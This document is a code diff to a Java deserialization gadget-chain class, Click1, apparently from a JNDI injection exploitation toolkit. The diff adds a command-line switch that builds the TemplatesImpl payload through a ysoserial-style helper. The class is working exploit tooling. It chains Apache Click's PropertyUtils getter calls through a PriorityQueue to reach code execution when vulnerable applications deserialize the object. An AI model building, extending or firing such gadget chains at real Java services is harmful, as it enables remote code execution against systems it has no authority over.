@@ -4,6 +4,7 @@ import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import org.apache.click.control.Column;
 import org.apache.click.control.Table;
@@ -11,6 +12,8 @@ import org.apache.click.control.Table;
 import java.math.BigInteger;
 import java.util.Comparator;
 import java.util.PriorityQueue;
+
+import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
  * Apache Click chain based on arbitrary getter calls in PropertyUtils.getObjectPropertyValue().
@@ -69,8 +72,13 @@ public class Click1 implements ObjectPayload<Object> {
         // finally, we inject and new TemplatesImpl object into the queue,
         // so its getOutputProperties() method will be called
         final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-        final Object   templates  = Gadgets.createTemplatesImpl(type, param);
-        queueArray[0] = templates;
+        final Object template;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            template = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            template = Gadgets.createTemplatesImpl(type, param);
+        }
+        queueArray[0] = template;
         return queue;
     }
 
